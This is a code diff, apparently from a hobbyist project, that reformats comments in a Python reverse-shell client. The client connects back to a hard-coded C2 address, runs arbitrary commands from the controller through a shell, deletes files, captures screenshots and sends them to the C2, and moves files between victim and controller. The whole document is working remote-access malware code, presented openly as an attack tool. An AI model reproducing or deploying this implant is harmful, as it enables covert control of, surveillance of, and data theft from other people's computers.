@@ -1,14 +1,15 @@
 #!/usr/bin/python3
 
 import socket
-import subprocess # libray which enables us to use trgt OS command in C2 server
-import os # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
+import subprocess            # libray which enables us to use trgt OS command in C2 server
+import os                    # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 
-# The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network. 
-import json
+import json                  # The process of encoding JSON is usually called serialization.
+			     # This term refers to the transformation of data into a series of bytes
+			     # (hence serial) to be stored or transmitted across a network
 
-# python library for taking screenshot
-import PIL.ImageGrab
+
+import PIL.ImageGrab         # python library for taking screenshot
 
 
 # Sending whole data all at once
@@ -18,8 +19,7 @@ def recv_eff():
 
 	while True:
 		try:
-			data = data + sock.recv(1024).decode('utf-8').rstrip()
-			# decoding data and striping out EOL spacing
+			data = data + sock.recv(1024).decode('utf-8').rstrip()        # decoding data and striping out EOL spacing
 
 			return json.loads(data)
 
@@ -30,7 +30,7 @@ def recv_eff():
 def send_eff(data):
 
 	json_data = json.dumps(data)
-	sock.send(json_data.encode('utf-8')) # encoding data to bytes
+	sock.send(json_data.encode('utf-8'))                # encoding data to bytes
 
 
 # For downloading files
@@ -82,12 +82,13 @@ def screenshot():
 # Offering a shell from trgt
 def shell():
 
-	global cmd
+	global cmd               # declaring global variable
 
 	while True:
 		cmd = recv_eff() # received response
 
-#shell command
+		# shell command features
+
 		if cmd == "exit": # ✓
 			break
 
@@ -101,7 +102,8 @@ def shell():
 		elif cmd[:2] == "cd" and len(cmd) > 1:
 
 			try:
-				os.chdir(cmd[3:]) # we know that after changing direc nothing is shown in terminal/cmd, so we have to send nothing back to C2 Server
+				os.chdir(cmd[3:])        # we know that after changing direc nothing is shown in terminal/cmd,
+						         # so we have to send nothing back to C2 Server
 
 			except:
 				continue
@@ -110,29 +112,31 @@ def shell():
 		elif cmd[:2] == "rm" and len(cmd) > 1:
 
 			try:
-				os.remove(cmd[3:]) # remove specified file path
+				os.remove(cmd[3:])       # remove specified file path
 
 			except:
-				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+				continue                 # we know that after removing path nothing is shown in terminal/cmd,
+							 # so we have to receive nothing as data from trgt
 
 		# Removing file path in Win ✓
 		elif cmd[:3] == "del" and len(cmd) > 1:
 
 			try:
-				os.remove(cmd[4:]) # remove specified file path
+				os.remove(cmd[4:])       # remove specified file path
 
 			except:
-				continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+				continue                 # we know that after removing path nothing is shown in terminal/cmd,
+							 # so we have to receive nothing as data from trgt
 
 
-		# Screenshot
+		# Screenshot ✓
 		elif (cmd[:10] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
 
-			screenshot() # Taking screenshot
+			screenshot()                     # Taking screenshot
 
-			upload_file('scrn_sht.png') # sending the ss to C2
+			upload_file('scrn_sht.png')      # sending the ss to C2
 
-			os.remove('scrn_sht.png') # removing the ss from trgt
+			os.remove('scrn_sht.png')        # removing the ss from trgt
 
 
 		# Exfiltration in trgt point of view ✓
@@ -146,11 +150,12 @@ def shell():
 			download_file(cmd[5:])
 
 		else:
-			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # To enable trgt machine's cmd/bash command to run in C2
+			# To enable trgt machine's cmd/bash command to run in C2
+			proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
-			result = proc.stdout.read() + proc.stderr.read() # to show output as well as error to the screen in response to the sent command
-			result = result.decode('utf-8') # decoding result that we got
-			send_eff(result) # getting output on the terminal
+			result = proc.stdout.read() + proc.stderr.read()        # to show output as well as error to the screen in response to the sent command
+			result = result.decode('utf-8')                         # decoding result that we got
+			send_eff(result)                                        # getting output on the terminal
 
 
 # creating socket object
@@ -158,13 +163,12 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 # Connecting with the trgt
-sock.connect(("192.168.0.105",1234)) # change the ip and port
+sock.connect(("192.168.0.105",1234))                                            # change the ip and port
 
 
 
 def main():
 	shell()
-	#sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
 
 if __name__ == '__main__':
 	main()
